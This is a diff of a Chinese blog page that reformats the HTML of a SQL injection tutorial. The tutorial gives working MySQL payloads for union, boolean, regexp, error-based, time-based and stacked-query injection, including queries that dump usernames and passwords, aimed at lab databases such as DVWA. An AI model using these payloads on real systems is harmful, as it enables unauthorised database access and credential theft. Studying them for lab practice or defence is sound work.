@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.5k 字
+      1.4k 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      21
+      20
        分钟
     </span>
   
@@ -227,17 +227,21 @@
             <h1 style="display: none">SQL基础</h1>
             
             <div class="markdown-body">
-              <h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p>
+              <h1>SQL</h1>
+<p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p>
 <ul>
-<li><a href="#sql">SQL</a><ul>
-<li><a href="#%E5%88%86%E7%B1%BB">分类</a><ul>
+<li><a href="#sql">SQL</a>
+<ul>
+<li><a href="#%E5%88%86%E7%B1%BB">分类</a>
+<ul>
 <li><a href="#%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B">变量类型</a></li>
 <li><a href="#http%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F">HTTP提交方式</a></li>
 <li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">注入方式</a></li>
 <li><a href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98">编码问题</a></li>
 </ul>
 </li>
-<li><a href="#%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93mysql-50%E4%BB%A5%E4%B8%8A">信息数据库（MySql 5.0以上）</a><ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93mysql-50%E4%BB%A5%E4%B8%8A">信息数据库（MySql 5.0以上）</a>
+<ul>
 <li><a href="#information_schema"><strong>information_schema</strong></a></li>
 <li><a href="#schemata%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><strong>SCHEMATA</strong>(所有数据库的基本信息)</a></li>
 <li><a href="#tables%E5%AD%98%E5%82%A8%E8%A1%A8%E4%BF%A1%E6%81%AF"><strong>TABLES</strong>(存储表信息)</a></li>
@@ -245,7 +249,8 @@
 <li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0">字符串连接函数</a></li>
 </ul>
 </li>
-<li><a href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">基本手工注入流程</a><ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">基本手工注入流程</a>
+<ul>
 <li><a href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0">获取字段数</a></li>
 <li><a href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取系统数据库名</a></li>
 <li><a href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取当前数据库名</a></li>
@@ -254,14 +259,17 @@
 <li><a href="#%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC">获取各个字段的值</a></li>
 </ul>
 </li>
-<li><a href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">常用注入方式</a><ul>
+<li><a href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">常用注入方式</a>
+<ul>
 <li><a href="#union%E6%B3%A8%E5%85%A5">union注入</a></li>
-<li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">布尔注入(构造逻辑判断)</a><ul>
+<li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">布尔注入(构造逻辑判断)</a>
+<ul>
 <li><a href="#regexp%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5">regexp正则注入</a></li>
 <li><a href="#like%E5%8C%B9%E9%85%8D%E6%B3%A8%E5%85%A5">like匹配注入</a></li>
 </ul>
 </li>
-<li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a><ul>
+<li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a>
+<ul>
 <li><a href="#floor%E5%92%8Crand">floor()和rand()</a></li>
 <li><a href="#extractvalue">extractvalue()</a></li>
 <li><a href="#updatexml">updatexml()</a></li>
@@ -283,95 +291,133 @@
 </ul>
 </li>
 </ul>
-<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h4><ul>
+<h2 id="分类"><a class="header-anchor" href="#分类">🍭</a>分类</h2>
+<h4 id="变量类型"><a class="header-anchor" href="#变量类型">🍭</a>变量类型</h4>
+<ul>
 <li>数字型</li>
 <li>字符型</li>
 </ul>
-<h4 id="HTTP提交方式"><a href="#HTTP提交方式" class="headerlink" title="HTTP提交方式"></a>HTTP提交方式</h4><ul>
+<h4 id="HTTP提交方式"><a class="header-anchor" href="#HTTP提交方式">🍭</a>HTTP提交方式</h4>
+<ul>
 <li>GET注入</li>
 <li>POST注入</li>
 <li>Cookie注入</li>
 </ul>
-<h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><ul>
+<h4 id="注入方式"><a class="header-anchor" href="#注入方式">🍭</a>注入方式</h4>
+<ul>
 <li>报错注入</li>
-<li>盲注<ul>
+<li>盲注
+<ul>
 <li>布尔盲注</li>
 <li>时间盲注</li>
 </ul>
 </li>
 <li>union注入</li>
 </ul>
-<h4 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h4><ul>
+<h4 id="编码问题"><a class="header-anchor" href="#编码问题">🍭</a>编码问题</h4>
+<ul>
 <li>宽字节注入</li>
 </ul>
-<h2 id="信息数据库（MySql-5-0以上）"><a href="#信息数据库（MySql-5-0以上）" class="headerlink" title="信息数据库（MySql 5.0以上）"></a>信息数据库（MySql 5.0以上）</h2><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h4><p>系统数据库，记录当前数据库的数据库，表，列，用户权限信息。</p>
-<h4 id="SCHEMATA-所有数据库的基本信息"><a href="#SCHEMATA-所有数据库的基本信息" class="headerlink" title="SCHEMATA(所有数据库的基本信息)"></a><strong>SCHEMATA</strong>(所有数据库的基本信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：union select 1,2,group_concat(schema_name) from information_schema.schemata </span><br></pre></td></tr></table></figure>
-
-<h4 id="TABLES-存储表信息"><a href="#TABLES-存储表信息" class="headerlink" title="TABLES(存储表信息)"></a><strong>TABLES</strong>(存储表信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询表： union select 1,2,group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure>
-
-<h4 id="COLUMNS-储存列信息"><a href="#COLUMNS-储存列信息" class="headerlink" title="COLUMNS(储存列信息)"></a><strong>COLUMNS</strong>(储存列信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询列：union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure>
-
-<h4 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h4><p>  concat(str1,str2,…)——没有分隔符地连接字符串</p>
-<p>  concata_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p>
-<p>  group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p>
-<h2 id="基本手工注入流程"><a href="#基本手工注入流程" class="headerlink" title="基本手工注入流程"></a>基本手工注入流程</h2><h4 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,database()</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
-
+<h2 id="信息数据库（MySql-5-0以上）"><a class="header-anchor" href="#信息数据库（MySql-5-0以上）">🍭</a>信息数据库（MySql 5.0以上）</h2>
+<h4 id="information-schema"><a class="header-anchor" href="#information-schema">🍭</a><strong>information_schema</strong></h4>
+<p>系统数据库，记录当前数据库的数据库，表，列，用户权限信息。</p>
+<h4 id="SCHEMATA-所有数据库的基本信息"><a class="header-anchor" href="#SCHEMATA-所有数据库的基本信息">🍭</a><strong>SCHEMATA</strong>(所有数据库的基本信息)</h4>
+<pre><code class="hljs crystal">查询数据库：<span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">group_concat</span>(<span class="hljs-title">schema_name</span>) <span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">schemata</span> </span></code></pre>
+<h4 id="TABLES-存储表信息"><a class="header-anchor" href="#TABLES-存储表信息">🍭</a><strong>TABLES</strong>(存储表信息)</h4>
+<pre><code class="hljs crystal">查询表： <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>) <span class="hljs-title">from</span></span>
+information_schema.tables where table_schema=<span class="hljs-string">&#x27;表名&#x27;</span></code></pre>
+<h4 id="COLUMNS-储存列信息"><a class="header-anchor" href="#COLUMNS-储存列信息">🍭</a><strong>COLUMNS</strong>(储存列信息)</h4>
+<pre><code class="hljs pgsql">查询列：<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span></code></pre>
+<h4 id="字符串连接函数"><a class="header-anchor" href="#字符串连接函数">🍭</a>字符串连接函数</h4>
+<p>concat(str1,str2,…)——没有分隔符地连接字符串</p>
+<p>concata_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p>
+<p>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p>
+<h2 id="基本手工注入流程"><a class="header-anchor" href="#基本手工注入流程">🍭</a>基本手工注入流程</h2>
+<h4 id="获取字段数"><a class="header-anchor" href="#获取字段数">🍭</a>获取字段数</h4>
+<pre><code class="hljs crmsh"><span class="hljs-keyword">order</span> <span class="hljs-title">by</span> n</code></pre>
+<h4 id="获取系统数据库名"><a class="header-anchor" href="#获取系统数据库名">🍭</a>获取系统数据库名</h4>
+<pre><code class="hljs angelscript">select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,schema_name <span class="hljs-keyword">from</span> information_schema.schemata</code></pre>
+<h4 id="获取当前数据库名"><a class="header-anchor" href="#获取当前数据库名">🍭</a>获取当前数据库名</h4>
+<pre><code class="hljs angelscript">select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database()</code></pre>
+<h4 id="获取数据库中的表"><a class="header-anchor" href="#获取数据库中的表">🍭</a>获取数据库中的表</h4>
+<pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()</code></pre>
 <p>or</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
-
+<pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre>
 <p>但法二需一一查询表名。</p>
-<h4 id="获取表中的字段"><a href="#获取表中的字段" class="headerlink" title="获取表中的字段"></a>获取表中的字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(column_name) from information_shema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取各个字段的值"><a href="#获取各个字段的值" class="headerlink" title="获取各个字段的值"></a>获取各个字段的值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(username,password) from users&#x2F;&#x2F;假设已经获取到表名为user，且字段为username和password</span><br></pre></td></tr></table></figure>
-
-<h2 id="常用注入方式"><a href="#常用注入方式" class="headerlink" title="常用注入方式"></a>常用注入方式</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union的作用是将两个sql语句进行联合。当注入参数的数据在数据库中不存在时，两个sql语句进行联合操作时，前一个语句选择的内容为空时，后面语句的查询内容就显示出来。如:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D;-1 union select 1,2,3 </span><br></pre></td></tr></table></figure>
-
-<h3 id="布尔注入-构造逻辑判断"><a href="#布尔注入-构造逻辑判断" class="headerlink" title="布尔注入(构造逻辑判断)"></a>布尔注入(构造逻辑判断)</h3><p>boolean 根据注入信息返回true or fales,无任何报错</p>
+<h4 id="获取表中的字段"><a class="header-anchor" href="#获取表中的字段">🍭</a>获取表中的字段</h4>
+<pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_shema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span></code></pre>
+<h4 id="获取各个字段的值"><a class="header-anchor" href="#获取各个字段的值">🍭</a>获取各个字段的值</h4>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>//假设已经获取到表名为<span class="hljs-keyword">user</span>，且字段为username和<span class="hljs-keyword">password</span></code></pre>
+<h2 id="常用注入方式"><a class="header-anchor" href="#常用注入方式">🍭</a>常用注入方式</h2>
+<h3 id="union注入"><a class="header-anchor" href="#union注入">🍭</a>union注入</h3>
+<p>union的作用是将两个sql语句进行联合。当注入参数的数据在数据库中不存在时，两个sql语句进行联合操作时，前一个语句选择的内容为空时，后面语句的查询内容就显示出来。如:</p>
+<pre><code class="hljs crystal">id =-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,3 </span></code></pre>
+<h3 id="布尔注入-构造逻辑判断"><a class="header-anchor" href="#布尔注入-构造逻辑判断">🍭</a>布尔注入(构造逻辑判断)</h3>
+<p>boolean 根据注入信息返回true or fales,无任何报错</p>
 <p><strong>相关函数</strong></p>
 <p><strong>length(str)</strong> ：返回字符串str的长度</p>
 <p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p>
 <p><strong>mid(str,pos,len)</strong> ：跟substr一样，截取字符串</p>
 <p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p>
 <p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39; and length (database())&#x3D;x(某个值，用大于或者小于某个值也可以)--+&#x2F;&#x2F;猜数据库名长度：(猜对时页面才会显示正常)</span><br><span class="line"></span><br><span class="line">&#39; and length((select schema_name from information_schema.schemata limit 0,1))&#x3D;18 --+ &#x2F;&#x2F;查询所有数据库的长度</span><br><span class="line"></span><br><span class="line">&#39; and left(database(),1)&#x3D;&#39;s&#39;--+ &#x2F;&#x2F;猜数据库的名字 </span><br><span class="line"></span><br><span class="line">&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 101--+&#x2F;&#x2F;获取数据库下的表</span><br><span class="line"></span><br><span class="line">&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1))&#x3D;9 --+ 查询表的长度</span><br><span class="line"></span><br><span class="line">&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+&#x2F;&#x2F;获取表里的列名</span><br><span class="line"></span><br><span class="line">&#39; and length((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;users&quot;limit 0,1))&gt;1 --+ &#x2F;&#x2F;查询列的长度</span><br><span class="line"></span><br><span class="line">&#39; and ord(mid((select ifnull(cast(username as char),x（错误返回值）)from security.users order by id limit 0,1),1,1))&#x3D;68--+ &#x2F;&#x2F;获取列的内容</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and length (database())=x(某个值，用大于或者小于某个值也可以)--+//猜数据库名长度：(猜对时页面才会显示正常)</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">18</span> <span class="hljs-comment">--+ //查询所有数据库的长度</span>
 
-<h4 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;(user() regexpri&#39;^&#39;) --+&#x2F;&#x2F;查看当前操作的用户</span><br><span class="line"> </span><br><span class="line">&#39; and 1&#x3D;(database() regexp&#39;^s&#39;) --+&#x2F;&#x2F;查看当前数据库</span><br><span class="line"></span><br><span class="line">&#39; and ((select schema_name from information_schema.schemata limit 0,1) regexp&#39;^i[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测第一个数据库的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1)regexp &#39;^g[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里第一个表的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select column_name from information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39; limit 0,1) regexp &#39;^u[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的第一个值</span><br><span class="line"> </span><br><span class="line">&#39; and ((select user from dvwa.users limit 0,1) regexp &#39;^a[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的user字段里的第一个值</span><br></pre></td></tr></table></figure>
+<span class="hljs-string">&#x27; and left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;--+ //猜数据库的名字 </span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) = <span class="hljs-number">101</span><span class="hljs-comment">--+//获取数据库下的表</span>
 
-<h4 id="like匹配注入"><a href="#like匹配注入" class="headerlink" title="like匹配注入"></a>like匹配注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure>
+<span class="hljs-string">&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="hljs-string">&#x27; limit 0,1))=9 --+ 查询表的长度</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> regexp <span class="hljs-string">&#x27;^us[a-z]&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+//获取表里的列名</span>
 
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a   &#x2F;&#x2F;利用错误信息得到当前数据库名</span><br></pre></td></tr></table></figure>
+<span class="hljs-string">&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1))&gt;1 --+ //查询列的长度</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ord(mid((<span class="hljs-keyword">select</span> ifnull(cast(username <span class="hljs-keyword">as</span> <span class="hljs-type">char</span>),x（错误返回值）)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><span class="hljs-comment">--+ //获取列的内容</span></code></pre>
+<h4 id="regexp正则注入"><a class="header-anchor" href="#regexp正则注入">🍭</a>regexp正则注入</h4>
+<pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and 1=(user() regexpri&#x27;</span>^<span class="hljs-string">&#x27;) --+//查看当前操作的用户</span>
+<span class="hljs-string"> </span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">database</span>() regexp<span class="hljs-string">&#x27;^s&#x27;</span>) <span class="hljs-comment">--+//查看当前数据库</span>
 
-<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure>
-
-<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure>
-
-<h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
-
-<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
-
-<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
-
-<h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
-
-<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
-
-<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
-
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
-
-<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5)) --+&#x2F;&#x2F;如果前面执行的正确执行0就为假 ,如果前面错误则执行后面sleep(5)延迟5秒</span><br></pre></td></tr></table></figure>
-
-<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&#39;;select if(sub(user(),1,1)&#x3D;&#39;r&#39;,sleep(3),1)%23</span><br></pre></td></tr></table></figure>
-
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><img src="/2020/11/08/SQL/%E5%95%A6%E5%95%A6%E5%95%A6.jpg" srcset="/img/loading.gif" alt="啦啦啦"></p>
